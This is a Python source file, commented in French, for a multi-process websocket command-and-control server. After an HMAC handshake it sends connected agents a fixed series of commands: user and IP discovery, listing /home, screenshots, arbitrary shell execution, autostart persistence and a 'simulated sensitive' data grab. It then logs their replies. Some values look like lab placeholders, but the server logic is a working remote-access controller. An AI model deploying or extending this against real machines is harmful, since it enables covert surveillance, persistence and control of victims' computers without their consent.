import asyncio
import json
import logging
import os
import signal
import sys
from multiprocessing import Process, current_process
import websockets
from common import verify_hmac, json_safe_loads

HOST = "0.0.0.0"
PORT = 8765
WORKERS = 2 # nombre de processus à modifier si plus voulus 

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger("mpserver")

COMMANDS = [
    {"id": 1, "cmd": "whoami"},
    {"id": 2, "cmd": "get_ips"},
    {"id": 3, "cmd": "list", "args": {"path": "/home", "max_depth": 1}},
    {"id": 4, "cmd": "uptime"},
    {"id": 5, "cmd": "screenshot"},
    {"id": 6, "cmd": "run_shell", "args": {"command": "echo hello from server"}},
    {"id": 7, "cmd": "setup_autostart"},
    {"id": 8, "cmd": "get_simulated_sensitive"},
    {"id": 0, "cmd": "bye"},
]

async def handle_client(ws, path):
    peer = ws.remote_address
    logger.info("[%s] Connexion de %s", current_process().name, peer)
    try:
        hello_raw = await asyncio.wait_for(ws.recv(), timeout=8)
        hello = json_safe_loads(hello_raw)
        if not hello:
            await ws.close()
            logger.warning("[%s] Hello malformé %s", current_process().name, peer)
            return

        minimal = {"os": hello.get("os"), "name": hello.get("name"), "ts": hello.get("ts")}
        sig = hello.get("hmac", "")
        if not verify_hmac(json.dumps(minimal).encode(), sig):
            await ws.send(json.dumps({"status": "auth_failed"}))
            logger.warning("[%s] Auth failed %s", current_process().name, peer)
            await ws.close()
            return

        client_os = hello.get("os", "unknown")
        client_name = hello.get("name", "unknown")
        logger.info("[%s] Auth OK: %s (%s)", current_process().name, client_name, client_os)
        await ws.send(json.dumps({"status": "auth_ok"}))

        for cmd in COMMANDS:
            await asyncio.sleep(0.5)
            await ws.send(json.dumps(cmd))
            logger.info("[%s] Envoyé cmd %s -> %s", current_process().name, cmd["id"], cmd["cmd"])
            try:
                resp_raw = await asyncio.wait_for(ws.recv(), timeout=15)
            except asyncio.TimeoutError:
                logger.warning("[%s] Timeout réponse %s", current_process().name, cmd["cmd"])
                continue
            resp = json_safe_loads(resp_raw)
            if not resp:
                continue
            out = str(resp.get("output"))
            out_preview = (out[:200] + "...") if len(out) > 200 else out
            logger.info("[%s] Réponse %s id=%s status=%s output=%s",
                        current_process().name, peer, resp.get("id"), resp.get("status"), out_preview)
        logger.info("[%s] Session terminée pour %s", current_process().name, peer)
    except websockets.ConnectionClosed:
        logger.info("[%s] Client déconnecté %s", current_process().name, peer)
    except Exception as e:
        logger.exception("[%s] Erreur handler: %s", current_process().name, e)

async def start_worker_server():
    server = await websockets.serve(handle_client, HOST, PORT, reuse_port=True)
    logger.info("[%s] Worker %s écoute sur %s:%s", current_process().name, current_process().pid, HOST, PORT)
    await server.wait_closed()

def run_worker():
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        loop.run_until_complete(start_worker_server())
    except Exception:
        logger.exception("[%s] Worker crashed", current_process().name)
    finally:
        loop.close()

def spawn_workers(n):
    procs = []
    for i in range(n):
        p = Process(target=run_worker, name=f"worker-{i+1}")
        p.start()
        procs.append(p)
        logger.info("Spawned %s pid=%s", p.name, p.pid)
    return procs

def shutdown_children(procs):
    logger.info("Arrêt des processus enfants...")
    for p in procs:
        try:
            p.terminate()
        except Exception:
            pass
    for p in procs:
        p.join(timeout=5)
    logger.info("Tous les workers arrêtés.")

def main():
    procs = spawn_workers(WORKERS)

    def _signal_handler(signum, frame):
        logger.info("Signal %s reçu, arrêt...", signum)
        shutdown_children(procs)
        sys.exit(0)

    signal.signal(signal.SIGINT, _signal_handler)
    signal.signal(signal.SIGTERM, _signal_handler)

    try:
        for p in procs:
            p.join()
    except KeyboardInterrupt:
        _signal_handler(signal.SIGINT, None)

if __name__ == "__main__":
    main()